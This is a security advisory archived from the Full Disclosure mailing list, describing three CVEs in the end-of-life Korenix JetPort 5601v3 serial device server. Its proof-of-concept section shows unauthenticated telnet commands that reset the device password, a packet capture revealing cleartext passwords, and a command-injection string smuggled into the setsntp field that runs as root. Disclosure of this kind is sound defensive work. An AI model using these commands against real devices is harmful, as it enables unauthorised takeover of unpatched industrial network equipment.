---
title: CyberDanube Security Research 20240805-0 | Multiple Vulnerabilities in JetPort Series
url: https://seclists.org/fulldisclosure/2024/Aug/2
source: Full Disclosure
date: 2024-08-07
fetch_date: 2025-10-06T18:06:20.561584
---

# CyberDanube Security Research 20240805-0 | Multiple Vulnerabilities in JetPort Series

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](1)
[By Date](date.html#2)
[![Next](/images/right-icon-16x16.png)](3)

[![Previous](/images/left-icon-16x16.png)](1)
[By Thread](index.html#2)
[![Next](/images/right-icon-16x16.png)](3)

![](/shared/images/nst-icons.svg#search)

# CyberDanube Security Research 20240805-0 | Multiple Vulnerabilities in JetPort Series

---

*From*: Thomas Weber via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Mon, 5 Aug 2024 13:53:58 +0000

---

```
CyberDanube Security Research 20240805-0
-------------------------------------------------------------------------------
                title| Multiple Vulnerabilities in JetPort Series
              product| Korenix JetPort Series
   vulnerable version| 1.2
        fixed version| None
           CVE number| CVE-2024-7395, CVE-2024-7396, CVE-2024-7397
               impact| High
             homepage| https://www.korenix.com/
                found| 2024-04-01
                   by| S. Dietz (Office Vienna)
                     | CyberDanube Security Research
                     | Vienna | St. Pölten
                     |
                     | https://www.cyberdanube.com
-------------------------------------------------------------------------------

Vendor description
-------------------------------------------------------------------------------
"Korenix Technology, a Beijer group company within the Industrial Communication
business area, is a global leading manufacturer providing innovative, market-
oriented, value-focused Industrial Wired and Wireless Networking Solutions.
With decades of experiences in the industry, we have developed various product
lines [...].

Our products are mainly applied in SMART industries: Surveillance, Machine-to-
Machine, Automation, Remote Monitoring, and Transportation. Worldwide customer
base covers different Sales channels, including end-customers, OEMs, system
integrators, and brand label partners. [...]"

Source: https://www.korenix.com/en/about/index.aspx?kind=3

Vulnerable versions
-------------------------------------------------------------------------------
Korenix JetPort 5601v3 / v1.2

Vulnerability overview
-------------------------------------------------------------------------------
1) Insufficient Authentication (CVE-2024-7395)
The configuration service on port 600/tcp doesnt require authentication to be
used. This allows an attacker to change the password or other critical
information.

2) Plaintext Communication (CVE-2024-7396)
The communication of the configuration service is transmitted in plain text.
An attacker could use this information to sniff passwords or other critical
information.

3) Unauthenticated Command Injection (CVE-2024-7397)
An attacker with network access an can execute arbitrary commands as root user
via the management service on port 600/tcp.

Proof of Concept
-------------------------------------------------------------------------------
1) Insufficient Authentication (CVE-2024-7395)
The management software JetPort Commander is used as an frontend for the telnet
service on 600/tcp. While it is possible to set a password, the passwords gets
sent to the software in cleartext and gets validated on the client software
rather than on the device. An attacker can bypass the management software by
using telnet to directly connect to the port. This allows him to reconfigure
the device including passwords and access controls.

$ telnet 192.168.122.76 600
Trying 192.168.122.76...
Connected to 192.168.122.76.
Escape character is '^]'.
-> setpassword poc

target:/$ cat /tmp/com2ip.conf
version:1.2.0
model:JetPort5601v3
name:JetPort5601v3-DEFAULT
serialno:0000000000000000
password:poc
switchmode:redundant
network:static:192.168.122.76:192.168.10.1:192.168.10.1

2) Plaintext Communication (CVE-2024-7396)
The management service uses telnet as protocol. We used tcpdump to inspect the
traffic during a password change. The new password (newpass) is readable during
transmission.

# sudo tcpdump -i virbr0 dst port 600 -X
14:17:25.461197 IP 192.168.122.240.49600 > 192.168.122.76.600: Flags [P.], seq 0:21, ack 13, win 16422, length 21
      0x0000:  4500 003d 16a7 4000 8006 6d86 c0a8 7af0  E..=..@...m...z.
      0x0010:  c0a8 7a4c c1c0 0258 522b 6096 12eb 337d  ..zL...XR+`...3}
      0x0020:  5018 4026 76bd 0000 7365 7470 6173 7377  P.@&v...setpassw
      0x0030:  6f72 6420 6e65 7770 6173 730d 0a         ord.newpass..

3) Unauthenticated Remote Code Execution (CVE-2024-7397)
The management service on port 600/tcp is used to configure JetPort devices
over the network. An attacker can inject arbitrary commands in multiple
settings options. The binary ser2net receives the data via the telnet
protocol and translates it to arguments for system() calls. For our PoC we
used the setsntp option to create the file /tmp/pwned.

$ telnet 192.168.122.76 600
Trying 192.168.122.76...
Connected to 192.168.122.76.
Escape character is '^]'.
-> setsntp pool.ntp.org$(touch /tmp/pwned),123,Asia/Taipei,1
OK
->

target:/$ ls -rtlha /tmp/
drwxrwxr-x   17 root     0            1.0k Apr  4 10:41 ..
-rw-r--r--    1 root     0               4 Apr  4 12:28 thttpd.pid
-rw-r--r--    1 root     0             712 Apr  4 12:29 com2ip.conf
-rw-r--r--    1 root     0               0 Apr  4 12:33 pwned
-------------------------------------------------------------------------------

The vulnerabilities were manually verified on an emulated device by using the
MEDUSA scalable firmware runtime (https://medusa.cyberdanube.com).

Solution
-------------------------------------------------------------------------------
None. Device is End-of-Life.

Workaround
-------------------------------------------------------------------------------
Limit the access to the device and place it within a segmented network.

Recommendation
-------------------------------------------------------------------------------
CyberDanube recommends customers from Korenix to remove the device from their
network topology.

Contact Timeline
-------------------------------------------------------------------------------
2024-04-08: Contacting Beijer Electronics Group via cs () beijerelectronics com.
2024-05-07: Received confirmation that the issue is beeing looked into.
2024-06-10: Contact stated that the product is considered EoL and will no
            longer receive security updates.
2024-06-10: Confirm receipt and telling them that we will publish the
            advisory after our 90-days deadline.
2024-08-05: Publication of the Advisory.

Web: https://www.cyberdanube.com
Twitter: https://twitter.com/cyberdanube
Mail: research at cyberdanube dot com

EOF Sebastian Dietz / @2024
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](1)
[By Date](date.html#2)
[![Next](/images/right-icon-16x16.png)](3)

[![Previous](/images/left-icon-16x16.png)](1)
[By Thread](index.html#2)
[![Next](/images/right-icon-16x16.png)](3)

### Current thread:

* **CyberDanube Security Research 20240805-0 | Multiple Vulnerabilities in JetPort Series** *Thomas Weber via Fulldisclosure (Aug 05)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https:...